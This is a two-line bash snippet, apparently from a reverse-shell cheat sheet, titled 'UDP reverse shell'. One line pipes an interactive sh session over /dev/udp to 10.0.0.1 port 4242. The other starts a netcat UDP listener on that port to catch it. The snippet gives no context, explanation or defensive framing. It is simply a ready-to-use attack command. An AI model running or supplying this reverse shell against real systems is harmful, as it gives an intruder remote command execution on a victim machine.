#!/bin/bash

#UDP reverse shell:
#Server:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

#Client:
nc -u -lvp 4242
